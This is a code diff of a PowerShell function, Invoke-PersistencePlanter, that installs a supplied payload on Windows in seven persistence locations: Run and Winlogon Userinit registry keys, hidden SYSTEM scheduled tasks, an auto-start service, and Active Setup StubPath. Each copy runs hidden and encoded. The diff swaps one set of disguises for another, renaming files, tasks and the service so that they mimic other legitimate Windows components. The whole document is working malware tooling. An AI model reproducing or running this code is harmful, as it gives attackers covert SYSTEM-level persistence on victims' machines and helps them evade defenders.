@@ -539,7 +539,7 @@ function Invoke-PersistencePlanter {
     Write-Info "Payload confirmed: $PayloadPath  ($(if ($IsExe) { 'EXE mode' } else { 'PS1 mode' }))"
     Write-Host ""
 
-    $DropDir = "C:\ProgramData\Microsoft\Windows\DiagTrack\Telemetry\cache"
+    $DropDir = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
     if (-not (Test-Path $DropDir)) {
         New-Item -ItemType Directory -Path $DropDir -Force | Out-Null
     }
@@ -553,8 +553,8 @@ function Invoke-PersistencePlanter {
 
     # [1/7] HKLM Run Key
     Write-Info "[1/7] Planting in HKLM Run registry key ..."
-    $Reg1Name = "WUDFComponentHost"
-    $Reg1Drop = if ($IsExe) { "$DropDir\wudf-host-svc.exe" } else { "$DropDir\wudf-host-svc.ps1" }
+    $Reg1Name = "WerFaultSvcHost"
+    $Reg1Drop = if ($IsExe) { "$DropDir\wer-handler-svc.exe" } else { "$DropDir\wer-handler-svc.ps1" }
     Copy-Item -Path $PayloadPath -Destination $Reg1Drop -Force
     $f1 = Get-Item $Reg1Drop -Force; $f1.Attributes = $f1.Attributes -bor [System.IO.FileAttributes]::Hidden
     $Reg1Cmd = if ($IsExe) { "`"$Reg1Drop`"" } else { "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Reg1Drop)" }
@@ -566,12 +566,12 @@ function Invoke-PersistencePlanter {
     # [2/7] Winlogon Userinit
     Write-Info "[2/7] Planting in Winlogon Userinit registry key ..."
     $Reg2Key  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-    $Reg2Drop = if ($IsExe) { "$DropDir\userinit-ext.exe" } else { "$DropDir\userinit-ext.ps1" }
+    $Reg2Drop = if ($IsExe) { "$DropDir\winlogon-ext.exe" } else { "$DropDir\winlogon-ext.ps1" }
     Copy-Item -Path $PayloadPath -Destination $Reg2Drop -Force
     $f2 = Get-Item $Reg2Drop -Force; $f2.Attributes = $f2.Attributes -bor [System.IO.FileAttributes]::Hidden
     $Reg2Append  = if ($IsExe) { ",$Reg2Drop" } else { ",powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Reg2Drop)" }
     $Reg2Current = (Get-ItemProperty -Path $Reg2Key -Name Userinit).Userinit
-    if ($Reg2Current -notmatch [regex]::Escape("userinit-ext")) {
+    if ($Reg2Current -notmatch [regex]::Escape("winlogon-ext")) {
         Set-ItemProperty -Path $Reg2Key -Name Userinit -Value ($Reg2Current.TrimEnd(',') + $Reg2Append) -Force
     }
     Write-Success "  HKLM:\...\Winlogon\Userinit (appended)"
@@ -580,9 +580,9 @@ function Invoke-PersistencePlanter {
 
     # [3/7] Hidden scheduled task under \Microsoft\Windows\
     Write-Info "[3/7] Planting hidden scheduled task in \Microsoft\Windows\ subfolder ..."
-    $Task3Name  = "DiagnosticsHub-StandardCollector"
-    $Task3Path  = "\Microsoft\Windows\DiagnosticsHub\"
-    $Task3Drop  = if ($IsExe) { "$DropDir\diaghub-collector.exe" } else { "$DropDir\diaghub-collector.ps1" }
+    $Task3Name  = "PerfTrack-StandardCollector"
+    $Task3Path  = "\Microsoft\Windows\PerfTrack\"
+    $Task3Drop  = if ($IsExe) { "$DropDir\perftrack-collector.exe" } else { "$DropDir\perftrack-collector.ps1" }
     Copy-Item -Path $PayloadPath -Destination $Task3Drop -Force
     $f3 = Get-Item $Task3Drop -Force; $f3.Attributes = $f3.Attributes -bor [System.IO.FileAttributes]::Hidden
     $Task3Action    = if ($IsExe) {
@@ -596,8 +596,8 @@ function Invoke-PersistencePlanter {
         -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
     $Task3Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     $TaskSvc = New-Object -ComObject Schedule.Service; $TaskSvc.Connect()
-    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("DiagnosticsHub") } catch {
-        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("DiagnosticsHub") | Out-Null
+    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("PerfTrack") } catch {
+        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("PerfTrack") | Out-Null
     }
     Unregister-ScheduledTask -TaskName $Task3Name -TaskPath $Task3Path -Confirm:$false -ErrorAction SilentlyContinue
     Register-ScheduledTask -TaskName $Task3Name -TaskPath $Task3Path -Action $Task3Action `
@@ -609,13 +609,13 @@ function Invoke-PersistencePlanter {
 
     # [4/7] Windows service (WMI lookalike)
     Write-Info "[4/7] Planting as a Windows service (WMI lookalike) ..."
-    $Svc4Name = "WmiPrvSE-Helper"
-    $Svc4Drop = if ($IsExe) { "$DropDir\wmiprvse-helper.exe" } else { "$DropDir\wmiprvse-helper.ps1" }
+    $Svc4Name = "WerFaultSvcExt"
+    $Svc4Drop = if ($IsExe) { "$DropDir\svchost-helper.exe" } else { "$DropDir\svchost-helper.ps1" }
     Copy-Item -Path $PayloadPath -Destination $Svc4Drop -Force
     $f4 = Get-Item $Svc4Drop -Force; $f4.Attributes = $f4.Attributes -bor [System.IO.FileAttributes]::Hidden
     $psExe = "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
     if ($IsExe) {
-        $Svc4WrapperPath = "$DropDir\wmiprvse-wrapper.ps1"
+        $Svc4WrapperPath = "$DropDir\svchost-wrapper.ps1"
         Set-Content -Path $Svc4WrapperPath -Value "`$p = Start-Process -FilePath '$Svc4Drop' -WindowStyle Hidden -PassThru`n`$p.WaitForExit()"
         $fw = Get-Item $Svc4WrapperPath -Force; $fw.Attributes = $fw.Attributes -bor [System.IO.FileAttributes]::Hidden
         $Svc4BinPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Svc4WrapperPath`""
@@ -625,9 +625,9 @@ function Invoke-PersistencePlanter {
     $existing = Get-Service -Name $Svc4Name -ErrorAction SilentlyContinue
     if ($existing) { Stop-Service -Name $Svc4Name -Force -ErrorAction SilentlyContinue; sc.exe delete $Svc4Name | Out-Null; Start-Sleep -Seconds 2 }
     sc.exe create $Svc4Name binPath= "$Svc4BinPath" start= auto obj= LocalSystem | Out-Null
-    sc.exe description $Svc4Name "Provides host process for Windows Management Instrumentation providers." | Out-Null
+    sc.exe description $Svc4Name "Provides host process extensions for Windows Error Reporting." | Out-Null
     sc.exe failure      $Svc4Name reset= 60 actions= restart/5000/restart/5000/restart/5000 | Out-Null
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$Svc4Name" -Name DisplayName -Value "WMI Provider Service Helper" -Force
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$Svc4Name" -Name DisplayName -Value "Windows Error Reporting Fault Extension" -Force
     Write-Success "  Service: $Svc4Name (AUTO_START, SYSTEM)"
     Write-Success "  Payload copy: $Svc4Drop (hidden)"
     if ($IsExe) { Write-Success "  EXE wrapper: $Svc4WrapperPath (hidden, WaitForExit keeps service alive)" }
@@ -635,14 +635,14 @@ function Invoke-PersistencePlanter {
 
     # [5/7] Active Setup StubPath
     Write-Info "[5/7] Planting in Active Setup Installed Components (StubPath) ..."
-    $AS5GUID    = "{89820200-ECBD-11CF-8B85-00AA005B4383}"
+    $AS5GUID    = "{76E4F460-2C62-4E3A-A5E6-00AA005B0083}"
     $AS5KeyPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$AS5GUID"
-    $AS5Drop    = if ($IsExe) { "$DropDir\iecompat-stub.exe" } else { "$DropDir\iecompat-stub.ps1" }
+    $AS5Drop    = if ($IsExe) { "$DropDir\edgecompat-stub.exe" } else { "$DropDir\edgecompat-stub.ps1" }
     Copy-Item -Path $PayloadPath -Destination $AS5Drop -Force
     $f5 = Get-Item $AS5Drop -Force; $f5.Attributes = $f5.Attributes -bor [System.IO.FileAttributes]::Hidden
     $AS5StubPath = if ($IsExe) { "`"$AS5Drop`"" } else { "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $AS5Drop)" }
     if (-not (Test-Path $AS5KeyPath)) { New-Item -Path $AS5KeyPath -Force | Out-Null }
-    Set-ItemProperty -Path $AS5KeyPath -Name "(Default)"   -Value "Internet Explorer Core Fonts" -Force
+    Set-ItemProperty -Path $AS5KeyPath -Name "(Default)"   -Value "Microsoft Edge Compatibility Fonts" -Force
     Set-ItemProperty -Path $AS5KeyPath -Name StubPath      -Value $AS5StubPath -Force
     Set-ItemProperty -Path $AS5KeyPath -Name Version       -Value "1,0,0,0" -Force
     Set-ItemProperty -Path $AS5KeyPath -Name Locale        -Value "EN" -Force
@@ -651,11 +651,11 @@ function Invoke-PersistencePlanter {
     Write-Success "  Payload copy: $AS5Drop (hidden)"
     Write-Host ""
 
-    # [6/7] Hidden scheduled task under \Microsoft\Windows\UpdateOrchestrator\
+    # [6/7] Hidden scheduled task under \Microsoft\Windows\USOPrivate\
     Write-Info "[6/7] Planting hidden scheduled task (UpdateOrchestrator, every 30 min) ..."
-    $Task6Name = "MusNotifyIconHandler"
-    $Task6Path = "\Microsoft\Windows\UpdateOrchestrator\"
-    $Task6Drop = if ($IsExe) { "$DropDir\musnot-handler.exe" } else { "$DropDir\musnot-handler.ps1" }
+    $Task6Name = "UsoCore-ServiceHandler"
+    $Task6Path = "\Microsoft\Windows\USOPrivate\"
+    $Task6Drop = if ($IsExe) { "$DropDir\wusvc-handler.exe" } else { "$DropDir\wusvc-handler.ps1" }
     Copy-Item -Path $PayloadPath -Destination $Task6Drop -Force
     $f6 = Get-Item $Task6Drop -Force; $f6.Attributes = $f6.Attributes -bor [System.IO.FileAttributes]::Hidden
     $Task6Action = if ($IsExe) {
@@ -669,8 +669,8 @@ function Invoke-PersistencePlanter {
     $Task6Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
         -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
     $Task6Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("UpdateOrchestrator") } catch {
-        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("UpdateOrchestrator") | Out-Null
+    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("USOPrivate") } catch {
+        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("USOPrivate") | Out-Null
     }
     Unregister-ScheduledTask -TaskName $Task6Name -TaskPath $Task6Path -Confirm:$false -ErrorAction SilentlyContinue
     Register-ScheduledTask -TaskName $Task6Name -TaskPath $Task6Path -Action $Task6Action `
@@ -680,11 +680,11 @@ function Invoke-PersistencePlanter {
     Write-Success "  Payload copy: $Task6Drop (hidden)"
     Write-Host ""
 
-    # [7/7] Hidden scheduled task under \Microsoft\Windows\OfficeData\
+    # [7/7] Hidden scheduled task under \Microsoft\Windows\Office 16\
     Write-Info "[7/7] Planting hidden scheduled task (OfficeData, every 30 min) ..."
-    $Task7Name = "OfficeBackgroundTaskHandlerRegistration"
-    $Task7Path = "\Microsoft\Windows\OfficeData\"
-    $Task7Drop = if ($IsExe) { "$DropDir\offdata-handler.exe" } else { "$DropDir\offdata-handler.ps1" }
+    $Task7Name = "ClickToRun-BackgroundHandler"
+    $Task7Path = "\Microsoft\Windows\Office 16\"
+    $Task7Drop = if ($IsExe) { "$DropDir\clicktorun-handler.exe" } else { "$DropDir\clicktorun-handler.ps1" }
     Copy-Item -Path $PayloadPath -Destination $Task7Drop -Force
     $f7 = Get-Item $Task7Drop -Force; $f7.Attributes = $f7.Attributes -bor [System.IO.FileAttributes]::Hidden
     $Task7Action = if ($IsExe) {
@@ -698,8 +698,8 @@ function Invoke-PersistencePlanter {
     $Task7Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
         -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
     $Task7Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("OfficeData") } catch {
-        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("OfficeData") | Out-Null
+    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("Office 16") } catch {
+        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("Office 16") | Out-Null
     }
     Unregister-ScheduledTask -TaskName $Task7Name -TaskPath $Task7Path -Confirm:$false -ErrorAction SilentlyContinue
     Register-ScheduledTask -TaskName $Task7Name -TaskPath $Task7Path -Action $Task7Action `
